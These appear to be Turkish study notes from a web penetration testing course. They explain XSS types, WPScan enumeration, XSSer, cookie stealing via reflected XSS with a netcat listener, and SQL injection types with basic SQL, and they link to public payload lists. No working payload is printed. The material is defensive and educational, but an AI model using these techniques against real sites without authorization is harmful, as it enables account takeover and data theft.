Kurban bağlantıya tıkladığında, ==web sitesi bu zararlı XSS kodunu yanıtın bir parçası olarak kurbanın tarayıcısına geri gönderir.== Tarayıcı bu kodu işler ve **zararlı script çalıştırılmış olur.**

![[Ekran görüntüsü 2025-09-02 172229 1.png]]

https://github.com/payloadbox/xss-payload-list  xss olup olmadığını anlamak için çeşiltli payloadlar sağlayan github deposu.

*NOT:*
- **XSS'in URL parametrelerine yansıyor olması Reflected XSS için en tehlikeli görülen senaryodur.** (çünkü kurbana kolayca link atılabilir).
- ==Ama tek şart değildir. Reflected XSS, **kullanıcı girdisi sunucuda saklanmadan yansıtıldığı sürece** POST, header, cookie gibi farklı kaynaklardan da tetiklenebilir.==
#### Exploiting Reflected XSS Vulnerabilities in WordPress:

**WPScan**, WordPress tabanlı web siteleri için geliştirilmiş **açık kaynaklı bir güvenlik tarama aracıdır**.  
Saldırganlar kadar güvenlik uzmanları ve sistem yöneticileri tarafından da kullanılır.

*WPScan’in Özellikleri*

- **WordPress çekirdeği** üzerindeki bilinen güvenlik açıklarını tarar.
- **Tema ve eklentilerdeki (plugins)** zafiyetleri tespit eder.
- WordPress’in güvenlik yapılandırmalarını analiz eder.
- Password brute force atakları yapılabilir.
- CVE ve güvenlik açıklarını güncel tutmak için kendi **vulnerability database**’ini (WPVulnDB) kullanır.

 *Kullanım Senaryoları*

- Güvenlik testi yapan uzmanların WordPress sitelerindeki açıkları hızlıca keşfetmesi.
- Sistem yöneticilerinin sitelerini düzenli olarak tarayıp güncel tutması.
- Saldırganların zayıf şifreleri ya da güncellenmemiş eklentileri hedef alması.

Kali repolarında mevcuttur.

Ancak **bilinen güvenlik açıkları (vulnerabilities) taraması**, yani CVE’leri ve WPVulnDB’deki detaylı zafiyetleri kullanarak tarama yapmak için **WPScan API anahtarına ihtiyaç vardır**.
Bu API anahtarını **[https://wpscan.com/](https://wpscan.com/?utm_source=chatgpt.com)** üzerinden kayıt olarak alırsınız. Sonrasında WPScan’de `--api-token <anahtar>` parametresiyle API’yı kullanabilir ve **güncel güvenlik açığı veritabanına erişim** sağlarsınız.

Temel Kullanım 

`wpscan --url https://hedefsite.com 

Bu kullanımda hefdef siteyi pasif yöntemlerle keşif eder. Yüklü pluginler versiyon taramaları gibi durumları çıkartır.
==--plugins-detection MODE==  ile çeşitli ( aktif,pasif,mix, agressive) geçiş yapılabilir. --help parametresinden bakabilirsiniz.

`--enumerate`  Bu parametre ile WPScan, site üzerindeki belirli **bileşenleri veya öğeleri listeler (enumerate)** ve zafiyet taramasına hazırlık yapar.

u   → Users: Site üzerindeki kullanıcı adlarını listeler
p   → Plugins: Aktif eklentileri listeler
t   → Themes: Yüklü temaları listeler
ap  → All Plugins: Hem aktif hem pasif eklentileri listeler
tt  → All Themes: Tüm temaları listeler
vp  → Vulnerable Plugins: Güvenlik açığı olan eklentileri listeler (API ile)
vt  → Vulnerable Themes: Güvenlik açığı olan temaları listeler (API ile)
cb  → Config Backup: Yapılandırma yedeklerini arar
dbe → Database Exports: Veritabanı yedeklerini arar

*NOT:*

Bazı XSS açıkları **sadece giriş yapmış (authenticated) kullanıcılar** tarafından tetiklenebilir. Bunun nedenleri:
1. **Kullanıcıya özel içerik:**
    - Bazı web uygulamaları, kullanıcıya özel sayfalar veya dashboard’lar sunar.
    - XSS payload’ı yalnızca bu sayfalarda geri yansıyorsa, saldırganın **login olması gerekir**.
2. **Yetki kısıtlaması:**
    - Admin paneli veya özel kullanıcı alanları gibi bölümlere **anonim kullanıcı erişemez**.
    - Eğer XSS bu alanlarda mevcutsa, test için **authenticated kullanıcı hesabı** gerekir.

#### Cookie Stealing Via Reflected XSS:

Netcat kullanarak reflected XSS ile kullanıcının cookie bilgilerini kendimize gönderebiliriz. Bunun için yükler oluşturulabilir. Örnek XSS bulunan bir  uygulama: https://7vabz65evl.execute-api.ap-southeast-1.amazonaws.com/default/

![[Pasted image 20250904201940.png]],

Dikkat edikmesi gereken şey Netcat **temel olarak tek bağlantı (single-connection) için tasarlanmıştır**. Yani bir portta bir listener açtığınızda, aynı anda sadece bir client bağlanabilir. Bir client bağlandığında, Netcat o bağlantıyı handle eder ve başka bir client bağlanamaz. Mevcut bağlantı kapanana kadar başka clientlar beklemek zorundadır.
## Introduction to Stored XSS:

Stored Cross-Site Scripting (Stored XSS), bir saldırganın güvenliksiz bir girdi alanı üzerinden **JavaScript kodunu doğrudan web uygulamasının veritabanına veya kaynak koduna enjekte etmesi** ile ortaya çıkan bir güvenlik açığıdır.

Bu açık, kullanıcılardan alınan girdilerin doğru şekilde filtrelenmemesi veya temizlenmemesi (input sanitization yapılmaması) nedeniyle oluşur.

Örneğin:  
Bir saldırgan, yorum formu veya kullanıcı adı alanına kötü niyetli bir **XSS payload** ekleyebilir. Bu payload, veritabanına kaydedilir ve ilgili sayfa her ziyaret edildiğinde sayfanın HTML içeriğine gömülü olarak kullanıcıların tarayıcılarında çalıştırılır. Böylece siteyi ziyaret eden **her kullanıcı saldırıya maruz kalır**.

Stored XSS, **reflected XSS’e göre daha tehlikelidir**, çünkü tek seferlik bir bağlantıya ihtiyaç duymaz; zararlı kod kalıcı olarak sistemde saklanır ve her ziyaretçi üzerinde çalışır.

![[Pasted image 20250905130835.png]]
## Introduction to DOM Based XSS:

**DOM-Based XSS (Document Object Model-Based XSS)**, web uygulamasının **DOM yapısındaki zafiyetlerden** kaynaklanan bir XSS türüdür. Bu saldırıda, zararlı payload doğrudan **istemci tarafında (tarayıcıda)** işlenir. Yani, zararlı kodun çalışması için veritabanına kaydedilmesi veya sunucudan geri dönmesi gerekmez.

 *Nasıl Çalışır?*
- Sayfadaki bir JavaScript kodu, kullanıcı girdisini alıp **doğrudan DOM içine ekliyorsa** (ör. `innerHTML`, `document.write`, `location.hash`, `document.URL` kullanımı) ve bu girdi filtrelenmiyorsa, saldırgan buraya zararlı kod enjekte edebilir.
- Bu durumda saldırgan, URL parametrelerini veya DOM içindeki değişkenleri manipüle ederek zararlı script’in çalışmasını sağlar.

**DOM-Based XSS saldırıları**, web sayfasının **Document Object Model (DOM)** yapısında bulunan zafiyetlerden kaynaklanır. Bu saldırıda, saldırgan web uygulamasının JavaScript kodundaki güvenlik açığını kullanarak değişkenlerin değerlerini manipüle eder ve zararlı kodu doğrudan DOM’a enjekte eder.

Bu tür XSS’te, zararlı kod sunucuya gitmez veya veritabanında saklanmaz; tamamen **istemci tarafında (tarayıcıda)** çalışır. Yani saldırı, kullanıcının tarayıcısında DOM manipülasyonu ile gerçekleşir.
 1. Stored XSS → Zararlı kod veritabanında saklanır.
 2. Reflected XSS → Zararlı kod URL üzerinden gelir, sunucu yanıtında geri yansıtılır.
 3. DOM-Based XSS → Zararlı kod **tamamen tarayıcı tarafında DOM manipülasyonu ile çalıştırılır**.

**Document Object Model (DOM)**, HTML ve XML belgeleri için kullanılan bir **programlama arayüzüdür**.
- DOM, bir web sayfasını **ağaç yapısına benzer hiyerarşik bir yapı** halinde temsil eder. Bu ağaçta her düğüm (node), sayfadaki bir elemente, attribute’a veya metin parçasına karşılık gelir.
- Geliştiriciler, DOM sayesinde bir web sayfasının **içeriğini ve davranışını dinamik olarak değiştirebilir**.

![[Pasted image 20250906123545.png]]
- Bir web sayfası tarayıcıya yüklendiğinde, HTML (ve varsa XML) kodu tarayıcı motoru(blink.webkit,gecko) tarafından **ağaç yapısına dönüştürülür** →  bu yapı DOM’dur.
-  HTML → Tarayıcı motoru → DOM ağacı (RAM’de). (JavaScript, bu oluşmuş DOM üzerinde çalışır.)

 **DOM ile yapılabilecek işlemlere örnekler:**
- Sayfaya yeni bir HTML elementi eklemek veya var olanı silmek.
- Bir elementin attribute’unu değiştirmek (ör. `<img>` etiketinin `src` değerini güncellemek).
- Kullanıcı etkileşimlerine (tıklama, klavye girişi vb.) yanıt vererek içerik güncellemek.
- Sayfanın temasının değişmesi. JavaScript, DOM aracılığıyla belirli bir elementin stilini ya da sınıfını (`class`) günceller.

Kaynak kodunda gördüğün `document.<something>` ifadeleri **tarayıcıda oluşturulan DOM nesnesine erişim** anlamına gelir.
- DOM-Based XSS **JavaScript fonksiyonlarının yanlış veya güvensiz kullanımından** kaynaklanır.
- `eval`, `innerHTML`, `document.write` gibi fonksiyonlar risklidir.

	- `innerHTML` → HTML olarak ekler, script çalıştırabilir.
	- `document.write()` → sayfaya yeni içerik yazar, script çalıştırır.
	- `eval()` → string içindeki JavaScript kodunu çalıştırır (çok tehlikeli).
	- `setTimeout(string, time)` veya `setInterval(string, time)` → string olarak JS çalıştırabilir.

#### XSSer: 

Cross Site "Scripter" (XSSer olarak da bilinir), **web tabanlı uygulamalarda XSS (Cross-Site Scripting) zafiyetlerini tespit etmek, istismar etmek ve raporlamak** için kullanılan otomatik bir çerçevedir (framework).

- XSSer, **çeşitli filtreleri atlatmaya yönelik seçenekler** ve farklı **kod enjeksiyon teknikleri** içerir.
- Amaç, güvenlik testi yapanların, uygulamalardaki XSS açıklıklarını hızlı ve otomatik şekilde keşfetmesini sağlamaktır.
- XSSer, **önceden yüklenmiş 1300’den fazla XSS saldırı vektörüne** sahiptir ve bu vektörler sayesinde farklı tarayıcılar ve WAF’lar (Web Application Firewall) üzerinde **filtreleri atlayıp istismar (bypass-exploit) gerçekleştirebilir**.
	 Yani araç, **hazır saldırı yöntemlerini** kullanarak XSS açıklarını hızlıca test edebilir.
	 Ayrıca farklı tarayıcıların ve güvenlik duvarlarının korumalarını aşmayı deneyebilir.
- 
https://github.com/epsylon/xsser

# Web Application Penetration Testing: SQLi Attacks(WPT): 

*Kapsam:*
- Introduction To SQL Injection.
- Types of SQL Injection Vulnerabilities.
- Introduction to Databases, DBMS, Relational Databases and NoSQL Databases.
- SQL Fundamentals.
- Hunting for SQL Injection Vulnerabilities.
- Identifying & Exploiting In-Band SQL Injection Vulnerabilities (Error-Based SQLi & UNION-Based SQLi).
- Identifying & Exploiting Blind SQL Injection Vulnerabilities (Time-Based SQLi & Boolean-Based SQLi).
- Identifying & Exploiting SQLi vulnerabilities with automated tools like SQLMap.
- Pentesting NoSQL Databases.
## Introduction to SQL Injection:

*İçerik:*
- History
- Impact
- Anatomy
- Types of SQLi

*CHEAT SHEET and PAYLOAD LISTS:*
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
https://github.com/payloadbox/sql-injection-payload-list
https://portswigger.net/web-security/sql-injection/cheat-sheet
#### Overview SQLi:

**SQL Injection (SQLi)**, bir web uygulaması güvenlik açığıdır. Bu zafiyet, saldırganın bir uygulamanın giriş alanlarına (örneğin form alanlarına) **kötü amaçlı SQL sorguları (malicious SQL statements)** enjekte etmesiyle ortaya çıkar.

Bu durum genellikle uygulamanın **kullanıcı girdisini (user input) doğru şekilde doğrulamaması** nedeniyle oluşur. Böylece saldırgan, veritabanını manipüle eden veya hassas bilgilere erişim sağlayan SQL kodları/sorguları sisteme enjekte edebilir. Buradaki sorun veritabanı kaynaklı  değil web uygulaması kaynaklıdır.  

Örneğin: Bir web sitesinin kullanıcı adı ve parola isteyen bir login formu olduğunu düşünelim. Eğer bu form kullanıcı girdilerini doğru şekilde kontrol etmiyorsa, saldırgan kullanıcı adı alanına **kötü amaçlı SQL ifadesi (malicious SQL statement)** girerek kimlik doğrulama sürecini atlatabilir. Bunun sonucunda, saldırgan yetkisiz şekilde giriş yapabilir ve web sitesinin veritabanına erişim elde edebilir.

**SQL Injection saldırıları**, çok ciddi sonuçlara yol açabilir. Bu sonuçlar arasında:

- Hassas verilerin çalınması (**theft of sensitive data**),
- Kritik sistemlere yetkisiz erişim (**unauthorized access**),
- Hatta tüm sistemin ele geçirilmesi (**full system compromise**) bulunur.

Günümüzde karmaşık web uygulamaları, genellikle kullanıcı bilgilerini (**user credentials**), verileri veya istatistikleri depolamak için **veritabanları** kullanır.
Sadece **Content Management Systems (CMSs)** değil, basit web siteleri bile sıklıkla **relational databases** (örn. **MySQL, MSSQL, SQL Server, Oracle, PostgreSQL**) ile bağlantı kurar.
Bu veritabanlarıyla iletişim kurmak için **Structured Query Language (SQL)** kullanılır. SQL, sistem yöneticileri (**system operators**), yazılımcılar (**programmers**), uygulamalar ve web uygulamaları tarafından veritabanı üzerinde işlem yapmak amacıyla kullanılan standart bir dildir.

*SQLi History:*

**“SQL Injection”** terimi, güvenlik araştırmacısı **Jeff Forristal** tarafından ortaya atılmıştır. Forristal, aynı zamanda **“Rain Forest Puppy”** takma adıyla da bilinir. Bu kavramı ilk kez ==**2000 yılında DefCon 8 konferansında**== sunduğu bir makalede kullanmıştır.
Forristal, **SQL Injection zafiyetini kamuya açık şekilde belgeleyen** ve bu açığın nasıl istismar edilerek (**exploited**) veritabanlarına ve hassas bilgilere yetkisiz erişim sağlanabileceğini açıklayan ilk güvenlik araştırmacılarından biridir.
Aslında **SQL Injection saldırıları**, web uygulamalarının (**web applications**) ve veritabanı odaklı web sitelerinin (**database-driven websites**) ilk dönemlerinden beri var olan, yani oldukça eski bir güvenlik açığıdır.s

**SQL Injection saldırıları**, web uygulamalarının (**web applications**) ve veritabanı odaklı sitelerin (**database-driven websites**) ilk dönemlerinden itibaren görülmeye başlanmıştır. İşte dikkat çekici bazı **tarihsel SQL Injection saldırıları**:

- **1998**: “**Rain Forest Puppy**” olarak bilinen saldırgan, SQL Injection kullanarak **U.S. Department of Energy** bilgisayar ağına erişim sağladı.
- **2000**: İlk kez geniş çapta duyurulan bir SQL Injection saldırısında, bir hacker **CD Universe** adlı e-ticaret sitesinden kredi kartı verilerini çaldı.
- **2002**: **“The Helldiggers”** olarak bilinen bir Rus hacker grubu, SQL Injection yoluyla **United Nations** veritabanına erişti ve hassas bilgileri ele geçirdi.
- **2012**: **LinkedIn data breach** olayı yaşandı. Saldırganlar SQL Injection kullanarak **6,5 milyon kullanıcının parolasını** çaldı.

*Impact:*

**Confidentiality (Gizlilik):**  
SQL veritabanları genellikle hassas verileri (sensitive data) barındırır. saldırgan, kullanıcı bilgileri, finansal veriler veya kişisel bilgileri izinsiz şekilde elde edebilir.

**Integrity (Bütünlük):**  
SQL Injection yalnızca verileri okumakla sınırlı değildir. Saldırganlar, veritabanındaki bilgileri **değiştirebilir, güncelleyebilir veya tamamen silebilir.** Bu durum, sistemin güvenilirliğini ve doğruluğunu doğrudan tehdit eder.

**Availability (Kullanılabilirlik):**  
SQL Injection saldırıları yalnızca gizlilik (**Confidentiality**) ve bütünlüğü (**Integrity**) değil, aynı zamanda **availability** ilkesini de tehdit edebilir. Saldırgan, veritabanına zarar vererek veya kritik verileri silerek, web uygulamasının **erişilemez hale gelmesine** neden olabilir. Bunun sonucu olarak web sitesi tamamen çökebilir ya da hizmet dışı kalabilir. 

**Authentication (Kimlik Doğrulama):**  
SQL sorguları, kullanıcı adı ve parola kontrollerini **authentication bypass** ile atlatma (kimlik doğrulama atlatması) saldırılarına yol açabilir. Bu durumda saldırgan, parolayı bilmeden başka bir kullanıcının (hatta bazen admin’in) hesabıyla sisteme giriş yapabilir.

Özetle;  SQL Injection saldırıları, **CIA**’nın üç ayağını da (Confidentiality, Integrity, Availability) etkileyebilir. Özellikle availability ihlali durumunda, web uygulaması ya da veritabanı **hizmet veremez hale gelir** ve bu da işletmeler için ciddi operasyonel kayıplara yol açar.

*Consequences:*

**Sensitive Data Exposure / Data Breaches (Hassas Veri İfşası / Veri İhlalleri):**  
SQL Injection saldırıları sonucunda, veritabanında saklanan **hassas verilere (sensitive data)** yetkisiz erişim sağlanabilir. Bu durumda saldırganlar; müşteri bilgilerini, finansal verileri veya **intellectual property (fikri mülkiyet)** gibi kritik bilgileri görüntüleyebilir ya da çalabilir.

**Data Manipulation (Veri Manipülasyonu):**  
Saldırganlar, SQL Injection yoluyla veritabanındaki bilgileri **değiştirme, güncelleme veya silme** imkânına sahip olabilir. Bu da **data loss (veri kaybı)** veya **data corruption (veri bozulması)** ile sonuçlanabilir.

**Code Execution (Kod Çalıştırma):**  
Eğer veritabanı kullanıcısı **administrative privileges (yönetici ayrıcalıkları)** ile çalışıyorsa, saldırgan SQL Injection üzerinden hedef sisteme **malicious code (kötü amaçlı kod)** enjekte edebilir. Bu durum, saldırganın sisteme tamamen erişim sağlamasına ve kontrolü ele geçirmesine yol açar.

**Business disruption** – Başarılı SQL injection saldırıları, işletmelerde **business disruption** yani iş sürekliliğinin bozulmasına yol açabilir. Bu tür saldırılar sonrası organizasyonlar, hizmetleri yeniden ayağa kaldırmak ve daha fazla saldırıyı önlemek için acil müdahaleler yapmak zorunda kalır. Bu durum, operasyonel aksamalara, gelir kaybına ve müşteri güveninde azalmaya neden olabilir.

*Anatomy:*

![[Pasted image 20250909202340.png]]

#### Types of SQLi:

![[Pasted image 20250909210138.png]]
#### 1. In-band SQL Injection (Klasik SQLi):

**In-band SQL injection** en yaygın SQL injection saldırı türüdür. Bu saldırı, bir saldırganın hem zararlı kodu göndermek hem de saldırının sonuçlarını almak için aynı iletişim kanalını kullanmasıyla gerçekleşir.
Başka bir deyişle saldırgan, web uygulamasına zararlı SQL kodu enjekte eder ve bu kodun çıktısını, kodu gönderdiği aynı kanal üzerinden alır.

**In-band SQL injection** saldırıları son derece tehlikelidir çünkü hassas bilgilerin çalınmasında, verilerin değiştirilmesinde veya silinmesinde kullanılabilir. Hatta bu saldırılar, yalnızca web uygulamasının değil, tüm sunucunun ele geçirilmesine kadar gidebilecek kritik güvenlik ihlallerine yol açabilir.

- **Error-based SQLi:**  
    Hatalardan yararlanılarak bilgi sızdırılır. Örn: hata mesajları tablolar, kolonlar hakkında bilgi verir.
- **Union-based SQLi:**  
    `UNION` SQL komutu kullanılarak başka tablolarla birleşim yapılıp veri sızdırılır.
#### 2. Blind SQL Injection (Kör SQLi):

**Blind SQL Injection**, bir web uygulamasındaki zafiyetten faydalanılarak yapılan ve veritabanı ya da enjekte edilen SQL sorgusunun sonuçları hakkında doğrudan bilgi vermeyen bir **SQL Injection** saldırı türüdür.
Bu saldırı türünde saldırgan, uygulamanın giriş alanlarına zararlı SQL kodları enjekte eder. Ancak uygulama, saldırgana doğrudan bilgi içeren bir çıktı ya da hata mesajı döndürmez. Bu nedenle saldırgan, veritabanı hakkında bilgi edinmek için farklı teknikler kullanır.

En sık kullanılan yöntemlerden bazıları:

- **Time-based Blind SQL Injection**: Saldırgan, belirli bir sorgunun sonucuna göre uygulamanın yanıt süresinde gecikme oluşturacak SQL kodları enjekte eder. Uygulamanın yanıt vermesi için geçen süreye bakarak sorgunun sonucu hakkında çıkarım yapar.

- **Boolean-based Blind SQL Injection**: Saldırgan, sorgunun doğru ya da yanlış dönmesine göre farklı davranışlar sergileyen SQL kodları kullanır. Uygulamanın verdiği yanıt üzerinden veritabanındaki veriler hakkında adım adım bilgi toplar.
`
#### 3. Out-of-band SQL Injection

**Out-of-band SQL Injection**, en az rastlanan **SQL Injection** saldırı türlerinden biridir. Bu saldırı türünde saldırgan, bir web uygulamasındaki zafiyeti kullanarak veritabanından veri çekmek için web uygulamasının kendisi dışında farklı bir iletişim kanalı kullanır.

**In-band SQL Injection**’dan farklı olarak saldırgan, enjekte ettiği SQL sorgusunun sonucunu uygulamanın cevabında doğrudan göremez. Bunun yerine, veriyi sistem dışına aktarmak için alternatif yöntemler kullanır.

Kullanılan bazı teknikler şunlardır:

- **HTTP request tabanlı veri sızdırma**: Saldırgan, veritabanındaki bilgileri kendi kontrolündeki harici bir sunucuya gönderilen HTTP istekleri aracılığıyla elde edebilir.
- **DNS query tabanlı veri sızdırma**: Saldırgan, veritabanı sorgularını DNS sorguları üzerinden yönlendirerek verileri dışarı çıkarabilir.

**Out-of-band SQL Injection**, nadir görülür ve tespiti çok daha zor olabilir. ==Çünkü uygulamanın normal yanıtlarında herhangi bir anormallik gözlenmez ve kullanılan teknikler In-Band ve Blind SQLi'daki gibi olabilir ancak yükü gönderdiğimiz ve aldığımız kanal farklıdır yani veri sızıntısı farklı bir kanaldan gerçekleşir.== Bu nedenle saldırgan, hedef sistemde fark edilmeden uzun süreli veri toplama işlemleri yapabilir.


## Introduction to DBMS:

**Database (Veritabanı)**, verilerin yönetilmesini, erişilmesini ve güncellenmesini kolaylaştıracak şekilde düzenlenmiş bir veri topluluğudur.

Bilgi teknolojilerinde, veritabanları genellikle bir **Database Management System (DBMS)** tarafından yönetilir. DBMS, kullanıcıların veya uygulamaların verilerle etkileşime geçmesini sağlayan araçlar ve arayüzler sunar.
Veritabanları, iş uygulamalarından web sitelerine ve mobil uygulamalara kadar pek çok alanda kullanılır. Hem **structured data** (yapılandırılmış veri) hem de **unstructured data** (yapılandırılmamış veri) saklanabilir.

Veritabanında saklanabilecek veri türlerine örnekler:
- **Customer information** (müşteri bilgileri)
- **Financial records** (finansal kayıtlar)
- **Product inventory** (ürün stok bilgileri)
- **Employee records** (çalışan kayıtları)

Kısacası, database modern bilgi sistemlerinin temel yapı taşlarından biridir ve büyük miktardaki verilerin güvenli, düzenli ve erişilebilir şekilde yönetilmesini sağlar.


**DBMS (Database Management System)**, kullanıcıların bir veritabanı üzerinde veri oluşturmasına, saklamasına, düzenlemesine, yönetmesine ve sorgulamasına imkân tanıyan yazılım sistemidir.

DBMS, kullanıcı ile veritabanı arasında bir **arayüz** görevi görür. Böylece kullanıcıların verilerin nasıl fiziksel olarak saklandığını veya geri çağrıldığını bilmesine gerek kalmaz; verilerle etkileşim basit komutlar ve sorgular aracılığıyla yapılır.

Bir DBMS’in sağladığı temel işlevler şunlardır:

- **Create / Delete / Modify / Query**: Veritabanında veri oluşturma, silme, değiştirme ve sorgulama işlemleri
- **Security management**: Verilere yetkisiz erişimi önleme
- **Concurrency control**: Birden fazla kullanıcının aynı anda güvenli şekilde veritabanına erişmesini sağlama
- **Backup & Recovery**: Veritabanının yedeklenmesi ve olası bir hata veya çökme durumunda geri yüklenmesi
- **Data integrity**: Verilerin doğruluğunu ve tutarlılığını koruma

Sonuç olarak **DBMS**, verilerin güvenli, düzenli ve ölçeklenebilir şekilde yönetilmesini sağlayarak modern bilgi sistemlerinin vazgeçilmez bir bileşeni haline gelmiştir.

==*TYPES OF DATABASES:*==

*Relational Databases (İlişkisel Veritabanları)* :
Verileri bir veya birden fazla tablo (**table / relation**) halinde organize eden veritabanlarıdır. Her tablo bir varlığı veya kavramı temsil ederken, tablodaki sütunlar (**columns**) o varlığın veya kavramın özelliklerini (**attributes**) gösterir. Örneğin bir “Customers” tablosu, müşteri adı, adres ve telefon gibi bilgileri sütunlar halinde tutar. 

**SQL Databases (SQL Veritabanları)**, verileri satır (**rows**) ve sütun (**columns**) biçiminde tablolarda saklayan **relational databases** türüdür. Bu veritabanlarında verilerle etkileşim için standart dil olarak **SQL (Structured Query Language)** kullanılır.

**Tables (Tablolar)** – İlişkisel bir veritabanının temel yapı taşları tablolardır (relations olarak da bilinir). Her tablo, **rows (satırlar / records / tuples)** ve **columns (sütunlar / attributes)** içerir.
- **Rows (satırlar)**: Her biri bir varlığın veya nesnenin benzersiz kaydını temsil eder.
- **Columns (sütunlar)**: Her sütun, o varlığın belirli bir özelliğini veya niteliğini gösterir.
    
**Keys (Anahtarlar)** – Tablodaki kayıtları benzersiz şekilde tanımlamak ve tablolar arasında ilişkiler kurmak için kullanılır
- **Primary key (Birincil anahtar)**: Her satırı benzersiz şekilde tanımlayan sütun veya sütunlar kümesidir. Verinin bütünlüğünü ve tekilliğini sağlar.
- **Foreign key (Yabancı anahtar)**: Bir tablodaki sütun, başka bir tablodaki **primary key**’i referans alır ve tablolar arasında ilişki kurulmasını sağlar.

**Relationships (İlişkiler)** – İlişkiler, tabloların birbirleriyle nasıl bağlantılı veya ilişkili olduğunu tanımlar.

Yaygın ilişki türleri şunlardır
- **One-to-One (Bire Bir)**: Bir tablodaki bir kayıt, diğer tablodaki yalnızca bir kayıtla eşleşir.
- **One-to-Many (Bire Çok)**: Bir tablodaki bir kayıt, diğer tablodaki birden fazla kayıtla eşleşebilir.
- **Many-to-Many (Çoka Çok)**: Bir tablodaki birden fazla kayıt, diğer tablodaki birden fazla kayıtla eşleşebilir; genellikle bu tür ilişkiler için ara tablolar kullanılır.

Bu ilişkiler, **primary key** ve **foreign key** kullanılarak kurulur. Böylece veriler, birden fazla tablo üzerinden **bağlantılı ve düzenli bir şekilde** erişilebilir ve yönetilebilir.

 
*NoSQL Databases* :
Geleneksel ilişkisel veritabanlarında kullanılan tablolara dayalı yapıyı kullanmayan veritabanlarıdır. Bunun yerine, **NoSQL** veritabanları farklı veri modelleri kullanarak veriyi saklar ve erişir. Örnekler arasında **document-based (MongoDB)**, 
**key-value store (Redis)** ve **graph databases (Neo4j)** bulunur. Bu veritabanları genellikle büyük veri, yüksek ölçeklenebilirlik ve esnek veri yapıları için tercih edilir.

**Özellikleri:**

- Büyük hacimli, **unstructured (yapılandırılmamış)** veya **semi-structured (yarı yapılandırılmış)** veriyi yönetebilir.
- Hızla değişen verilerle etkili bir şekilde çalışabilir.
- Esnek veri modelleri sayesinde farklı veri tiplerini kolayca depolayabilir.

**Kullanım alanları:**

- Modern web uygulamaları
- Big data (Büyük veri) analizleri
- Real-time streaming (gerçek zamanlı veri akışı)
- Content management systems (İçerik yönetim sistemleri)
- Esneklik, ölçeklenebilirlik ve performansın kritik olduğu diğer senaryolar

Kısaca, NoSQL veritabanları, RDBMS’in sınırlamalarının ötesinde veri yönetimi sağlar ve özellikle büyük veri ve dinamik veri gereksinimlerinde tercih edilir.

*Object-oriented Databases (Nesne Yönelimli Veritabanları):*
Verileri tablolarda saklamak yerine **objects (nesneler)** olarak depolar. Bu yaklaşım, daha karmaşık veri yapıları ve nesneler arası ilişkilerin yönetilmesini kolaylaştırır. Nesne tabanlı programlamayla uyumlu çalıştığı için özellikle yazılım geliştirme süreçlerinde bazı avantajlar sağlar.

## Introduction to  SQL:

Karmaşık web uygulamaları, genellikle verileri, kullanıcı kimlik bilgilerini veya istatistikleri saklamak için bir **database** kullanır. Hem **CMS (Content Management Systems)** yapıları hem de basit kişisel web sayfaları, **MySQL, SQL Server, Oracle, PostgreSQL** gibi veritabanlarına bağlanabilir.

Veritabanlarıyla etkileşim kurmak için uygulamalar ve web uygulamaları **SQL (Structured Query Language)** kullanır.

**SQL**, bir veritabanından veri almak (**extract**) ve veriler üzerinde değişiklik yapmak (**manipulate**) için kullanılan güçlü bir sorgulama dilidir. Web uygulamalarında SQL komutları (queries), genellikle **server-side code** (sunucu tarafı kodu) içine gömülerek çalıştırılır.

Bu sayede web uygulamaları, kullanıcı isteklerini veritabanına iletebilir, gerekli verileri çekebilir ve dinamik içerik üretebilir.

**Server-side code**, genellikle veritabanına bağlantı kurma ve bu bağlantıyı sürdürme işini **connectors** aracılığıyla yapar.

**Database connectors** (veya **database drivers**) belirli bir veritabanına, bir uygulama ya da programlama dili üzerinden bağlanmayı ve etkileşim kurmayı sağlayan yazılım bileşenleri ya da kütüphanelerdir.

Bu bileşenler sayesinde uygulamalar:
- Veritabanı ile iletişim kurabilir,
- **Queries (sorgular)** çalıştırabilir,
- Verileri alabilir (**retrieve**) veya değiştirebilir (**modify**),
- **Transactions (işlemler)** yürütebilir ve yönetebilir.

Kısacası, database connectors uygulama ile veritabanı arasında bir köprü işlevi görür ve web uygulamalarının dinamik, güvenilir ve verimli çalışmasını mümkün kılar.

Temel bazı SQL komutları:

- **SELECT**: Veritabanındaki tablolardan veri sorgulamak ve görüntülemek için kullanılır.
- **UNION**: İki veya daha fazla SELECT sorgusunun sonuçlarını tek bir sonuç kümesinde birleştirir.
- **INSERT**: Bir tabloya yeni kayıt (satır) eklemek için kullanılır.
- **UPDATE**: Var olan kayıtların belirli alanlarını güncellemek için kullanılır.
- **DELETE**: Tablodaki kayıtları silmek için kullanılır.
- **ORDER BY**: Sorgu sonucunu belirli bir sütuna göre artan veya azalan sırada listeler.
- **LIMIT**: Sorgudan dönecek maksimum satır sayısını sınırlandırmak için kullanılır.

Spesifik karakterler:

![[Pasted image 20250911193147.png]]

*SELECT STATEMENT:*
- `SELECT` → Hangi sütunları istediğini seçersin.
- `FROM` → Hangi tablodan veriyi alacağını belirtirsin.
- Ek olarak `WHERE, ORDER BY, GROUP BY, LIMIT` gibi ifadelerle daha güçlü sorgular oluşturursun.

![[Pasted image 20250911193718.png]]

`SELECT name,description` 
`FROM products` 
`WHERE id=9;` 

Product tablosoundan name ve description sütununu id'si 9 olan satırı çeker.

`SELECT *` 
`FROM Customers`
`WHERE Country = 'USA';`

Sadece `Country = 'USA'` olan kayıtları getirir.


*UNION STATEMENT*

`UNION`, birden fazla **`SELECT` sorgusunun sonuçlarını tek bir sonuç kümesinde birleştirmek** için kullanılır.

`SELECT column1, column2 FROM table1`
`UNION`
`SELECT column1, column2 FROM table2;`

NOT: ==Her iki `SELECT` sorgusunda da sütun sayısı eşit olmalı.==

*LIMIT ve ORDER BY*  
`LIMIT`, bir SQL sorgusundan dönecek **satır sayısını sınırlamak** için kullanılan bir komuttur.

`SELECT *` 
`FROM Customers`
`LIMIT 5;`

LIMIT genelde ORDER BY ile kullanılır ve daha anlamlı olur.

`SELECT *` 
`FROM Orders`
`ORDER BY OrderDate DESC`
`LIMIT 3;`

En son sipariş edilen 3 kaydı döndürür.

## Finding SQLi-1 (Manuel) :

Bir SQL enjeksiyon zaafiyetinden yararlanmak için ilk adım, web uygulaması içinde enjeksiyon yapılabilecek bir nokta (parametre, form alanı veya URL bileşeni gibi) bulmaktır. Bu tespit edildikten sonra, enjeksiyon yapılabilecek parametreye yerleştirilecek uygun bir SQL sorgusu veya payload hazırlanır.

